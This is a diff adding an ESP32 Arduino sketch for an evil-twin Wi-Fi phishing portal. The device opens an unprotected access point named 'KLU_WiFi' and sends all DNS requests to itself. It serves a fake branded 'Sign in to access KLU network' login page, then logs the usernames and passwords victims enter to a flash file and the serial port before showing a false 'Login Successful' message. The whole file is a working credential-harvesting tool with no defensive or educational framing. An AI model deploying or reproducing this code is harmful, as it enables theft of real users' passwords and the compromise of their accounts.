@@ -1,0 +1,107 @@
+#include <Arduino.h>
+#include <WiFi.h>
+#include <AsyncTCP.h>
+#include <ESPAsyncWebServer.h>
+#include <DNSServer.h>
+#include <FS.h>
+#include <SPIFFS.h>
+
+// Wi-Fi AP settings
+const char* ssid = "KLU_WiFi";  // Matches the theme
+const char* password = "";       // Open AP for simplicity
+
+// DNS server
+DNSServer dnsServer;
+const byte DNS_PORT = 53;
+
+// Web server on port 80
+AsyncWebServer server(80);
+
+// Store captured credentials
+String capturedUsername = "";
+String capturedPassword = "";
+
+void saveCredentials(String username, String password) {
+  File file = SPIFFS.open("/credentials.txt", FILE_APPEND);
+  if (file) {
+    file.println("Username: " + username + " Password: " + password);
+    file.close();
+    Serial.println("Credentials saved to SPIFFS.");
+  } else {
+    Serial.println("Error saving credentials.");
+  }
+}
+
+void setup() {
+  Serial.begin(115200);
+
+  // Initialize SPIFFS
+  if (!SPIFFS.begin(true)) {
+    Serial.println("An Error has occurred while mounting SPIFFS");
+    return;
+  }
+
+  // Start AP mode
+  WiFi.softAP(ssid, password);
+  Serial.println("AP Started");
+  Serial.print("IP Address: ");
+  Serial.println(WiFi.softAPIP());
+
+  // Start DNS server (redirect all domains to ESP32 IP)
+  dnsServer.start(DNS_PORT, "*", WiFi.softAPIP());
+
+  // Serve the logo image from SPIFFS
+  server.serveStatic("/logo.jpg", SPIFFS, "/logo.jpg");
+
+  // Serve the captive portal page
+  server.on("/", HTTP_GET, [](AsyncWebServerRequest* request) {
+    String html = "<!DOCTYPE html><html><head>";
+    html += "<meta name='viewport' content='width=device-width, initial-scale=1.0'>";
+    html += "<style>body { font-family: Arial, sans-serif; text-align: center; background-color: #fff; }";
+    html += ".container { width: 90%; max-width: 400px; margin: auto; padding-top: 20px; }";
+    html += ".logo img { max-width: 100%; height: auto; margin-bottom: 20px; }";
+    html += "input[type='text'], input[type='password'] { width: 100%; padding: 10px; margin: 10px 0; border: 1px solid #ccc; border-radius: 5px; }";
+    html += "button { width: 100%; padding: 12px; background-color: #44ac33; color: #fff; border: none; border-radius: 5px; cursor: pointer; }";
+    html += "button:hover { background-color: #55bd42; }";
+    html += ".footer { color: #e63946; font-size: 0.9em; margin-top: 20px; }";
+    html += "</style></head><body>";
+    html += "<div class='container'>";
+    html += "<div class='logo'><img src='/logo.jpg'></div>";
+    html += "<h1>Sign in to access KLU network</h1>";
+    html += "<form method='POST' action='/login'>";
+    html += "<input name='username' type='text' placeholder='Username' required>";
+    html += "<input name='password' type='password' placeholder='Password' required>";
+    html += "<button type='submit'>Sign in</button>";
+    html += "</form>";
+    html += "<div class='footer'>***Change the Password after First time Login***</div>";
+    html += "</div></body></html>";
+    request->send(200, "text/html", html);
+  });
+
+  // Handle login submission
+  server.on("/login", HTTP_POST, [](AsyncWebServerRequest* request) {
+    if (request->hasParam("username", true) && request->hasParam("password", true)) {
+      capturedUsername = request->getParam("username", true)->value();
+      capturedPassword = request->getParam("password", true)->value();
+      saveCredentials(capturedUsername, capturedPassword);
+      Serial.println("Captured Credentials:");
+      Serial.println("Username: " + capturedUsername);
+      Serial.println("Password: " + capturedPassword);
+    }
+
+    String successPage = "<html><head><meta http-equiv='refresh' content='2;url=http://www.google.com'></head>";
+    successPage += "<body><h2>Login Successful! Redirecting...</h2></body></html>";
+    request->send(200, "text/html", successPage);
+  });
+
+  // Catch all other requests and redirect to the portal
+  server.onNotFound([](AsyncWebServerRequest* request) {
+    request->redirect("http://192.168.4.1/"); // ESP32's default AP IP
+  });
+
+  // Start the web server
+  server.begin();
+}
+void loop() {
+  dnsServer.processNextRequest(); // Handle DNS requests
+}
